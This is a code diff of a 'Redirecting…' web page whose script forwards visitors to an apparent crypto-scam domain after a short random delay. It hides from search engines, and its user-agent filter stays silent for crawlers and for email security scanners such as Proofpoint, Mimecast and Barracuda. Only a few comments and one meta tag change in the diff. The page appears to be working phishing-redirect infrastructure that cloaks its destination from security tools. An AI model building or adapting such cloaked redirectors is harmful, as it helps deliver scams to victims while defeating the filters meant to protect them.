@@ -4,7 +4,6 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
 <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
-<meta name="referrer" content="no-referrer">
 <meta http-equiv="Cache-Control" content="no-store">
 <title>Redirecting…</title>
 <style>
@@ -118,9 +117,9 @@
    CONFIG
    ============================================================ */
 const CONFIG = {
-  targetUrl: "https://dash.bitco-in-green.pro", // ← your destination
-  minDelay: 1500,     // ms — minimum wait before Continue appears
-  maxDelay: 2500      // ms — maximum wait
+  targetUrl: "https://dash.bitco-in-green.pro", // ← destination
+  minDelay: 1500,   // ms — minimum wait before Continue appears
+  maxDelay: 2500    // ms — maximum wait
 };
 
 (function () {
@@ -130,7 +129,7 @@ const CONFIG = {
   const $status = document.getElementById('status');
   const $btn    = document.getElementById('goBtn');
 
-  /* ---------- Bot filter (only obvious bots) ---------- */
+  /* ---------- Bot filter (obvious bots only) ---------- */
   const ua = navigator.userAgent || "";
   const botPatterns = [
     /bot\b/i, /crawler/i, /spider/i,
@@ -143,7 +142,7 @@ const CONFIG = {
     /barracuda/i, /proofpoint/i, /mimecast/i
   ];
   for (const p of botPatterns) {
-    if (p.test(ua)) return; // stay silent, no redirect
+    if (p.test(ua)) return; // silent exit — no redirect
   }
 
   /* ---------- Detect automation ---------- */
